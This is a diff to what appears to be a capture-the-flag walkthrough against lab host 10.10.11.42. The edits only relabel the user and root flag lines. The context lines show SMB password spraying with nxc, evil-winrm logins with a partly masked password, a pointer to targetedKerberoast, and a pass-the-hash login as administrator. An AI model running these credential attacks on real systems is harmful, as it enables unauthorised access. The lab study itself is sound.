@@ -45,7 +45,7 @@ Than you will get this username and password
 nxc smb 10.10.11.42 -u /home/kali/Username.txt -p /home/kali/Password.txt --continue-on-success
 or 
 evil-winrm -i 10.10.11.42 -u 'emily' -p 'UXLCI5iETUs_xxx_VTj8yQFKoHjXmb'
-user flag
+(user flag)
 
 
 Here you have to download targetedkerberoast :-
@@ -58,3 +58,4 @@ evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
 >cd Desktop
 >ls
 >cat root.txt
+(root flag)
